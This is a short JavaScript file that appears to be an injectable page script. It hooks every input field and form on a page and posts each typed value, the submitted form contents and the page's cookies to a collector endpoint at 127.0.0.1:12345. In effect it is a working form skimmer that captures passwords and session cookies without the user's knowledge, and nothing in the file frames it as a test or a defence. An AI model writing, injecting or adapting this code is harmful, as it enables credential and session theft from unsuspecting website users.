
if(typeof __e == "undefined")
{
    __e = (function(){

    	function start()
    	{
          registerEvent( "EnterURL", { url : getLocation() } );
          hookAllInputs();
          hookAllForms();
    	}

      function hookAllInputs()
      {
          var inputs = document.getElementsByTagName("input");
          for( var i = 0; i < inputs.length; i++)
          {
              inputs[i].addEventListener("change", function(){
                  registerEvent("InputChanged", {
                    name: this.name,
                    id: this.id,
                    value : this.value,
                    url : getLocation()
                  });
              });
          }
      }

      function hookAllForms()
      {
          var forms = document.getElementsByTagName("form");
          for(var i = 0; i < forms.length; i++)
          {
              forms[i].addEventListener("submit", function(){
                  var elems = processFormValues(this.elements);
                  elems.push({ name : "action", value : this.action });
                  registerEvent("FormSubmited", elems);
              });
          }
      }

      function registerEvent(eventName, args)
      {
          args.cookie = document.cookie;
          var req = new XMLHttpRequest();
          req.open("POST", "http://127.0.0.1:12345/e-service/" + eventName, true);
          req.send(JSON.stringify(args));
      }

      function processFormValues(array)
      {
          var fields = [];
          for(var i = 0 ; i < array.length; i++)
          {
              fields.push({
                  name  : array[i].name,
                  id    : array[i].id,
                  value : array[i].value
              });
          }
          return fields;
      }

      function getLocation()
      {
           var l = document.location;
           return l.protocol + "//" + l.hostname + l.pathname + l.search + (l.port.length > 0 ? ":" + l.port : "");
      }

      start();
      return { start : start };

    })();
}
